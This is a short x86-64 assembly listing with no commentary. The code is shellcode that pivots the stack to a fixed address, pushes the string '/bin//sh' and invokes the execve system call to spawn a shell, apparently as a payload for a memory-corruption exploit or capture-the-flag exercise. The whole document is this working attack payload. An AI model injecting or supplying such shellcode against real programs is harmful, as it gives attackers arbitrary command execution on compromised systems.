BITS 64

mov rsp,0x404890
mov rax,0x3b
push 0
mov rbx,0x68732f2f6e69622f
push rbx
mov rdi,rsp
mov rsi, 0
mov rdx,0
syscall
